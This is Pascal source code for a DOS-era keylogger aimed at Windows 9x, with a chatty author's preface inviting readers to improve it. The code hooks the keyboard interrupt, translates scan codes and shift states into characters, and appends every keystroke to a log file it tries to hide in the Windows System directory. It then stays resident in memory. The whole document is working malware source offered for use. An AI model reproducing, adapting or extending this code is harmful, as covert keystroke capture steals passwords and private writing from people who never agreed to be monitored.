{
  CoLdBLood's Keylogger
  =====================
   The Dos keylogger for winbloz 9x.

  Date: 1999/10/01

  Version : 99

  I dunno how bug free this is i re-written the whole program
  today so didnt have mutch time to find anybugs... and the previous
  one i wrote never cuased error or messedup but if there is sumthing
  u have the source fix it

  BTW there is a lots of space to add improvement and keys etc... i
  didnt get to everything - but it works

  Enjoy this source code becoz it has no comments - sorry ive been up
  for 16hrs!

  The backspace only says backspace and doesnt do a actual backspace -
  i prefer  this method - but may previous one i made did have that
  abillity so it shouldnt be that hard to implement... hint: look at
  how the cpu's stack works.

  Later
  CB
}





{$M $800,0,0 }

uses Crt, Dos;
{
176 ° = esc
177 ± = backspace
178 ² = tab
179 ³ = enter
180 ´ = control
181 µ = left shift
182 ¶ = right shift
183 · = alt
184 ¸ = capslock
185 ¹ = f1
186 º = f2
187 » = f3
188 ¼ = f4
189 ½ = f5
190 ¾ = f6
191 ¿ = f7
192 À = f8
193 Á = f9
194 Â = f10
195 Ã = num lock
196 Ä = scroll lock
197 Å = dummy
198 Æ = f11
199 Ç = f12
}
const
 __info_1_ : string = 'CoLdBLood''s KeyLogger'; { just to add sum info in the binary code }
 __info_2_ : string = '1999/10/01';
 __info_3_ : string = 'Version: 99';

 fname    = 'keyb.log';
 ourint   = $60;
 enter    = #13#10;
 {some keys}

 keycommands : array[176..183] of string =
              ('[ESC]',
               '[BACKSPACE]',
               '[TAB]',
               '[ENTER]'+enter,
               '[CONTROL]',
               '',
               '',
               '[ALT]');

 keystring : string =  {1...........14}
                       '°1234567890-=±'+
                       {15..........28}
                       '²qwertyuiop[]³'+
                       {29..........40}
                       '´asdfghjkl;'''+
                       {41..........54}
                       '`µ\zxcvbnm,./¶'+
                       {55..........67}
                       '*· ¸¹º»¼½¾¿ÀÁ'+
                       {68...........83}
                       'ÂÃÄ789-456+1230.'+
                       {84..88}
                       'ÅÅÅÆÇ'+
                   {88+{1...........14}
                       '°!@#$%^&*()_+±'+
                       {15..........28}
                       '²QWERTYUIOP{}³'+
                       {29..........40}
                       '´ASDFGHJKL:"'+
                       {41..........54}
                       '~µ|ZXCVBNM<>?¶'+
                       {55..........67}
                       '*· ¸¹º»¼½¾¿ÀÁ'+
                       {68...........83}
                       'ÂÃÄ789-456+1230.'+
                       {84..88}
                       'ÅÅÅÆÇ';

var
 f    : file;
 path : string;
 char : byte;
 oldc : byte;
{$F+}

function shifts : boolean;
{ returns true if any of the shifts keys are being pressed }
begin
 shifts:=(mem[$0040:$0017] and $03) > 0;
end;

function ledkeys:byte;
{ returns 1 = scroll              lock on
          2 = num                 lock on
          3 = scroll & num        lock on
          4 = caps                lock on
          5 = caps   & scoll      lock on
          6 = caps   & num        lock on
          7 = scroll,  num & caps lock on }
begin
 ledkeys := mem[$0040:$0097] and $07;
end;

procedure writes(var f: file;s:string);
begin
 blockwrite(f,ptr(seg(s),ofs(s)+1)^,length(s));
end;

procedure keylogger; interrupt;
label endit;
begin
 asm
  mov   ch,[bp+$10]
  mov   char,ch
 end;
 if char < 128 then
 begin
  if char in [2..13,16..27,30..40,41,43..53,55,57,71..83] then
  begin
   if shifts or (ledkeys in [4,5,6,7]) then char := char+88;
   if (char in [72,75,77,80]) then
   if not(ledkeys in [2,3,6,7]) then goto endit;
   reset(f,1);
   seek(f,filesize(f));
   blockwrite(f,keystring[char],1);
   close(f);
  end else
  if (ord(keystring[char]) in [176..183]) then
  if ((char<>oldc)or (ord(char)= 177)) then
  begin
   oldc:=char;
   reset(f,1);
   seek(f,filesize(f));
   writes(f,keycommands[ord(keystring[char])]);
   close(f);
  end;
 end;
endit:
end;
{$F-}
const
 winstr : array[1..2] of string = ('windir','winbootdir');

var
 I     : Integer;
 s     : string;
 y,m,d,w : word;
 hr,min,sec,hund : word;
function inttostr(i: longint): string;
var
 s : string;
begin
 str(i,s);
 inttostr := s;
end;

begin
 clrscr;
 path:='C:\'+fname;
 for I := 1 to EnvCount do
 begin
  s:=envstr(i);
  if boolean(pos(winstr[1],s) or pos(winstr[2],s)) then
  begin
   i:=pos('=',s)+1;
   path:=copy(s,i,length(s));
   path:=path+'\System\'+fname;
   break;
  end;
 end;

 {$I-}
 assign(f,path);
 reset(f);
 close(f);
 {$I+}
 if IOResult <> 0 then
 begin
  rewrite(f);
  writes(f,'CoLdBLood''s KeyLogger'+enter);
  writes(f,'~~~~~~~~~~~~~~~~~~~~~~'+enter+enter);
  close(f);
 end;

 GetDate(y,m,d,w);
 GetTime(hr,min,sec,hund);
 write(s,'Date: '+inttostr(y)+'/'+inttostr(m)+'/'+inttostr(d)+enter);
 write(s,'Time: '+inttostr(hr)+':'+inttostr(min)+':'+inttostr(sec)+enter+enter);

 SetIntVec(ourint,Addr(keylogger));
 Keep(0);

end.